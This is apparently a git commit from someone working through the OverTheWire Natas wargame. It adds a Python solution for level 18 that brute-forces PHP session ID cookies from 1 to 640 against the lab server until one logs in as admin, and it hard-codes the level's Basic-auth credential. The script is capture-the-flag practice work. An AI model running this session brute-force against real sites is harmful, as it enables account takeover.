38d559c39951522aed5c81656b1d60a06a9e893f
jesse mailhot <coshmeo@gmail.com>
2022-01-26 11:59:13 -0800

    finished payload for 18, added notes.txt for 19.

---
+++ 18/payload.py
@@ -0,0 +1,15 @@
+import requests
+from bs4 import BeautifulSoup
+
+headers = {'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=='}
+
+url = 'http://natas18.natas.labs.overthewire.org/index.php'
+
+for i in range(1, 641): # per source there are 640 session IDs
+    r = requests.post(url, headers=headers, cookies={'PHPSESSID':'{}'.format(i)})
+    if 'next' in r.text: # the word next only appears in the response when you've successfully logged in
+        
+        soup = BeautifulSoup(r.text, 'html.parser')
+        print(soup.get_text())
+
+        break
